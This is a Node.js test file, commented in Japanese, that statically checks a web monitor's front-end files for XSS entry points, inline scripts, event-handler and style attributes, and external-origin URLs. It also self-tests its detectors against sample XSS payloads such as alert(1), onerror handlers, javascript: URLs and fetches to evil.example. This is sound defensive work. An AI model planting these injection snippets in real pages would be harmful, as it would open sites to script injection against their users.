// ビューの静的ファイル（public/）のソース検査（Issue #21 / Red）。
//
//   [sink]  public/*.js に DOM 経由の XSS の入口が無い（innerHTML / outerHTML / insertAdjacentHTML / document.write / eval / new Function。
//           Issue 外の追加: createContextualFragment / DOMParser / srcdoc / setAttribute('on…') / javascript: / Function(…)）
//           全文で検査する（コメント内の字面でも FAIL。誤爆は書き方を変えれば済み、検知漏れより安い）
//   [html]  index.html にインライン <script> 本文・on*= 属性・style= 属性・<style>・外部オリジン・絶対パス / スキーム付きの URL・<base> が無い。
//           script は type="module" src="app.js"（相対 URL）、link は rel="stylesheet" href="style.css"（相対 URL）
//   [asset] app.js / style.css に外部オリジンの URL（http(s):// / プロトコル相対 //host）・@import が無い。app.js は api/state と api/stream を参照する
//
// 検査自体の自己診断（lessons #5 / #10）: 既知の悪い書き方を必ず検出し、安全な書き方は誤検出しない。
// 検査対象が空（public/ が無い・.js が 0 本）なら FAIL。読めなければ例外のまま FAIL（握りつぶさない）。
//
// ════════════════════════════════════════════════════════════════════════════
//  変異テスト対応表（防御を1つ外した隔離コピーで、左の変異に対し右のテストが FAIL するべき）
// ════════════════════════════════════════════════════════════════════════════
//   app.js に el.innerHTML = x を足す（outerHTML / insertAdjacentHTML / document.write / eval / new Function も1つずつ）
//                                    [sink] 実ソース検査が FAIL（6 変異それぞれ。違反名を含むメッセージ）
//   検査の正規表現から innerHTML を外す  [sink 自己診断] 検知漏れ（innerHTML のサンプル）
//   index.html に <script>alert(1)</script> / onclick= / style= / <style> / https://… / <base> を足す
//                                    [html] 実ソース検査が FAIL（変異ごと）
//   index.html の src を /app.js（絶対パス）にする  [html] 相対 URL のみ
//   style.css に @import url(https://…) を足す       [asset] 外部オリジン

import test from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, readdirSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { MONITOR_DIR } from './helpers.mjs';

const PUBLIC_DIR = join(MONITOR_DIR, 'public');

// ---------- [sink] ----------

const SINKS = [
  ['innerHTML', /\binnerHTML\b/],
  ['outerHTML', /\bouterHTML\b/],
  ['insertAdjacentHTML', /\binsertAdjacentHTML\b/],
  ['document.write', /\bdocument\s*\.\s*write(?:ln)?\b/],
  ['document[write]', /\bdocument\s*\[\s*['"`]write(?:ln)?['"`]\s*\]/],
  ['eval', /\beval\b/],
  ['new Function', /\bnew\s+Function\b/],
  ['Function(', /(?<![\w$.])Function\s*\(/],
  ['createContextualFragment', /\bcreateContextualFragment\b/],
  ['DOMParser', /\bDOMParser\b/],
  ['srcdoc', /\bsrcdoc\b/],
  ["setAttribute('on…')", /\bsetAttribute\s*\(\s*['"`]\s*on/i],
  ['javascript:', /\bjavascript\s*:/i],
];

/** @returns {string[]} 見つかったシンクの名前 */
export function findSinks(src) {
  return SINKS.filter(([, re]) => re.test(src)).map(([name]) => name);
}

const SINK_BAD = {
  innerHTML: 'el.innerHTML = value;',
  'innerHTML（ブラケット）': "el['innerHTML'] = value;",
  outerHTML: 'el.outerHTML = value;',
  insertAdjacentHTML: "el.insertAdjacentHTML('beforeend', value);",
  'document.write': 'document.write(value);',
  'document . write（空白）': 'document . write(value);',
  'document.write（改行）': 'document\n  .write(value);',
  'document.writeln': 'document.writeln(value);',
  'document["write"]': "document['write'](value);",
  eval: 'eval(code);',
  'window.eval': 'window.eval(code);',
  'new Function': "const f = new Function('return 1');",
  'new  Function（空白）': "const f = new   Function ('return 1');",
  'Function(…)': "const f = Function('return 1');",
  createContextualFragment: 'range.createContextualFragment(html);',
  DOMParser: "new DOMParser().parseFromString(html, 'text/html');",
  srcdoc: 'frame.srcdoc = html;',
  "setAttribute('onclick')": "el.setAttribute('onclick', 'x()');",
  'javascript: URL': "a.href = 'javascript:alert(1)';",
  'コメントの後ろの本物': "// don't\nel.innerHTML = value;",
  '文字列の後ろの本物': 'const s = "it\'s";\nel.innerHTML = value;',
};
const SINK_GOOD = {
  textContent: 'el.textContent = value;',
  createElement: "const div = document.createElement('div'); parent.append(div); parent.replaceChildren();",
  setAttribute: "el.setAttribute('class', 'row'); el.setAttribute('title', value);",
  replaceChildren: 'list.replaceChildren(...rows);',
  evaluate: 'const evaluate = 1; retrieval(); evaluator();',
  'Function を含む語': 'const MyFunction = 1; isFunction(x); typeof x === "function";',
  'メソッド名の Function': 'obj.Function(1);',
  'document.createTextNode': "document.createTextNode('x'); document.getElementById('a');",
  'document.writer': 'document.writer = 1;',
};

test('[sink 自己診断] 悪い書き方は必ず検出する', () => {
  for (const [name, src] of Object.entries(SINK_BAD)) {
    assert.ok(findSinks(src).length > 0, `検知漏れ: ${name}`);
  }
});

test('[sink 自己診断] 安全な書き方（textContent / createElement / 似た語）は誤検出しない', () => {
  for (const [name, src] of Object.entries(SINK_GOOD)) {
    assert.deepEqual(findSinks(src), [], `誤検出: ${name}`);
  }
});

test('[sink 自己診断] 6 種の指定シンク（innerHTML / outerHTML / insertAdjacentHTML / document.write / eval / new Function）は個別の名前で報告される', () => {
  const expect = {
    'el.innerHTML = 1': 'innerHTML',
    'el.outerHTML = 1': 'outerHTML',
    'el.insertAdjacentHTML("a", 1)': 'insertAdjacentHTML',
    'document.write(1)': 'document.write',
    'eval(1)': 'eval',
    'new Function(1)': 'new Function',
  };
  for (const [src, name] of Object.entries(expect)) assert.ok(findSinks(src).includes(name), `${src} -> ${findSinks(src).join(',')}`);
});

function publicFiles(pred) {
  assert.ok(existsSync(PUBLIC_DIR), `${PUBLIC_DIR} が無い（検査対象が空では PASS させない）`);
  return readdirSync(PUBLIC_DIR).filter(pred).sort();
}

test('[sink] public/ に app.js がある（検査対象が空では PASS させない）', () => {
  const js = publicFiles((n) => n.endsWith('.js'));
  assert.ok(js.includes('app.js'), `app.js が無い: ${js.join(',')}`);
});

test('[sink] public/*.js のどこにも XSS の入口（innerHTML 等）が無い（全文検査）', () => {
  const js = publicFiles((n) => n.endsWith('.js') || n.endsWith('.mjs'));
  assert.ok(js.length >= 1, 'public/ に .js が 1 本も無い');
  for (const f of js) {
    const src = readFileSync(join(PUBLIC_DIR, f), 'utf8');
    assert.ok(src.length > 0, `${f} が空`);
    assert.deepEqual(findSinks(src), [], `${f} に危険な API がある`);
  }
});

test('[sink] public/index.html の中の <script> 本文にも XSS の入口が無い（インラインは別途禁止だが二重に見る）', () => {
  const html = readFileSync(join(PUBLIC_DIR, 'index.html'), 'utf8');
  assert.deepEqual(findSinks(html), [], 'index.html に危険な API の字面がある');
});

test('[sink] public/ に想定外のファイル（.js / .mjs / .html / .css 以外の実行可能物、サブディレクトリ）が無い', () => {
  const names = readdirSync(PUBLIC_DIR).sort();
  assert.deepEqual(names, ['app.js', 'index.html', 'style.css'], `public/ の内容: ${names.join(',')}`);
});

// ---------- [html] ----------

/** @returns {string[]} 問題の説明 */
export function htmlProblems(html) {
  const problems = [];
  const scripts = [...html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script\s*>/gi)];
  const opens = (html.match(/<script\b/gi) ?? []).length;
  if (opens !== scripts.length) problems.push('閉じていない <script>');
  for (const [, attrs, body] of scripts) {
    if (body.trim() !== '') problems.push('インライン <script> 本文');
    if (!/\ssrc\s*=/i.test(attrs)) problems.push('src の無い <script>');
  }
  if (/<style\b/i.test(html)) problems.push('<style> 要素');
  if (/<base\b/i.test(html)) problems.push('<base> 要素');
  if (/<(?:iframe|object|embed|form)\b/i.test(html)) problems.push('iframe / object / embed / form');
  for (const [tag] of html.matchAll(/<[A-Za-z][^>]*>/g)) {
    if (/[\s"'/]on[a-z]+\s*=/i.test(tag)) problems.push(`on*= 属性: ${tag.slice(0, 40)}`);
    if (/[\s"'/]style\s*=/i.test(tag)) problems.push(`style= 属性: ${tag.slice(0, 40)}`);
  }
  if (/(?:https?:)?\/\/[A-Za-z0-9[]/i.test(html)) problems.push('外部オリジン / プロトコル相対 URL');
  if (/\b(?:javascript|data|vbscript|blob|file):/i.test(html)) problems.push('危険なスキームの URL');
  for (const m of html.matchAll(/\b(?:src|href|action|formaction|poster|data|srcset|ping)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/gi)) {
    const value = m[1] ?? m[2] ?? m[3];
    if (!/^[A-Za-z0-9._-]+$/.test(value)) problems.push(`相対ファイル名でない URL: ${value.slice(0, 40)}`);
  }
  return problems;
}

const HTML_GOOD = `<!doctype html>
<html lang="ja"><head><meta charset="utf-8"><title>t</title>
<link rel="stylesheet" href="style.css"></head>
<body><div id="app"></div><script type="module" src="app.js"></script></body></html>`;

const HTML_BAD = {
  'インライン script': '<script>alert(1)</script>',
  'インライン script（属性付き）': '<script type="module">import("x")</script>',
  'src の無い空 script': '<script></script>',
  '閉じない script': '<script src="app.js">',
  onclick: '<button onclick="x()">b</button>',
  'onload（大文字）': '<body ONLOAD="x()">',
  'onerror（引用符の直後）': '<img src="a.png"onerror=x>',
  'style 属性': '<div style="color:red">x</div>',
  'style 属性（シングル）': "<div style='color:red'>x</div>",
  'style 要素': '<style>body{color:red}</style>',
  'base 要素': '<base href="/">',
  外部script: '<script src="https://cdn.example.com/x.js"></script>',
  'プロトコル相対': '<script src="//cdn.example.com/x.js"></script>',
  '外部 link': '<link rel="stylesheet" href="http://evil.example/x.css">',
  '絶対パスの src': '<script type="module" src="/app.js"></script>',
  '絶対パスの href': '<link rel="stylesheet" href="/style.css">',
  'サブディレクトリの src': '<script type="module" src="public/app.js"></script>',
  '上位ディレクトリ': '<script type="module" src="../app.js"></script>',
  'javascript: URL': '<a href="javascript:alert(1)">x</a>',
  'data: URL': '<img src="data:image/png;base64,AAAA">',
  iframe: '<iframe src="app.js"></iframe>',
  form: '<form action="app.js"></form>',
  'クォート無しの絶対 src': '<script type=module src=/app.js></script>',
};

test('[html 自己診断] 悪い HTML は必ず検出し、良い HTML は誤検出しない', () => {
  assert.deepEqual(htmlProblems(HTML_GOOD), [], '基準の良い HTML が誤検出された');
  for (const [name, frag] of Object.entries(HTML_BAD)) {
    const withGood = HTML_GOOD.replace('</body>', `${frag}</body>`);
    assert.ok(htmlProblems(frag).length > 0, `検知漏れ（単体）: ${name}`);
    assert.ok(htmlProblems(withGood).length > 0, `検知漏れ（良い HTML に混入）: ${name}`);
  }
});

const readHtml = () => readFileSync(join(PUBLIC_DIR, 'index.html'), 'utf8');

test('[html] index.html にインライン script・on*= / style= 属性・<style>・外部オリジン・絶対パス URL が無い', () => {
  assert.deepEqual(htmlProblems(readHtml()), []);
});

test('[html] index.html は <script type="module" src="app.js"> を 1 つだけ、<link rel="stylesheet" href="style.css"> を 1 つだけ持つ（相対 URL）', () => {
  const html = readHtml();
  assert.ok(html.length > 0);
  const scripts = [...html.matchAll(/<script\b([^>]*)>/gi)].map((m) => m[1]);
  assert.equal(scripts.length, 1, `script の数: ${scripts.length}`);
  assert.match(scripts[0], /\btype\s*=\s*["']?module["']?/i);
  assert.match(scripts[0], /\bsrc\s*=\s*["']?app\.js["']?(?:\s|$)/i);
  const links = [...html.matchAll(/<link\b([^>]*)>/gi)].map((m) => m[1]);
  assert.equal(links.length, 1, `link の数: ${links.length}`);
  assert.match(links[0], /\brel\s*=\s*["']?stylesheet["']?/i);
  assert.match(links[0], /\bhref\s*=\s*["']?style\.css["']?(?:\s|$|\/)/i);
});

test('[html] index.html は文書として最低限の形（doctype・lang・charset・title）を持つ', () => {
  const html = readHtml();
  assert.match(html, /^\s*<!doctype html>/i);
  assert.match(html, /<html\b[^>]*\blang\s*=/i);
  assert.match(html, /<meta\b[^>]*\bcharset\s*=\s*["']?utf-8["']?/i);
  assert.match(html, /<title>[^<]+<\/title>/i);
});

// ---------- [asset] ----------

/** @returns {string[]} */
export function assetProblems(src) {
  const problems = [];
  if (/(?:https?:)?\/\/[A-Za-z0-9[]/i.test(src.replace(/\/\*[\s\S]*?\*\//g, ''))) problems.push('外部オリジン / プロトコル相対 URL');
  if (/@import\b/i.test(src)) problems.push('@import');
  if (/\bimport\s*\(\s*['"`]\s*(?:https?:)?\/\//.test(src)) problems.push('外部の動的 import');
  return problems;
}

test('[asset 自己診断] 外部オリジン・@import・外部の動的 import は検出し、相対 URL は誤検出しない', () => {
  for (const bad of [
    '@import url(https://fonts.example/x.css);', '@import "x.css";', 'a{background:url(http://evil.example/x.png)}',
    "fetch('https://evil.example/x')", "fetch('//evil.example/x')", "import('https://evil.example/x.js')",
  ]) assert.ok(assetProblems(bad).length > 0, `検知漏れ: ${bad}`);
  for (const good of [
    "fetch('api/state')", "new EventSource('api/stream')", 'a{color:red}', "import { x } from './util.js';",
    '/* https://example.com の説明 */ a{color:red}',
  ]) assert.deepEqual(assetProblems(good), [], `誤検出: ${good}`);
});

test('[asset] app.js / style.css に外部オリジンの URL・@import が無い', () => {
  for (const f of ['app.js', 'style.css']) {
    const src = readFileSync(join(PUBLIC_DIR, f), 'utf8');
    assert.ok(src.length > 0, `${f} が空`);
    assert.deepEqual(assetProblems(src), [], f);
  }
});

test('[asset] app.js は /api/state と /api/stream を（相対または同一オリジンの絶対パスで）参照する', () => {
  const src = readFileSync(join(PUBLIC_DIR, 'app.js'), 'utf8');
  assert.match(src, /api\/state/);
  assert.match(src, /api\/stream/);
});

test('[asset] app.js は DOM 起動を document がある時だけ行う（node から import できる形）', () => {
  const src = readFileSync(join(PUBLIC_DIR, 'app.js'), 'utf8');
  assert.match(src, /typeof\s+document\s*(?:!==|!=)\s*['"]undefined['"]/);
  assert.match(src, /^\s*export\s/m, 'ES module として export している');
});
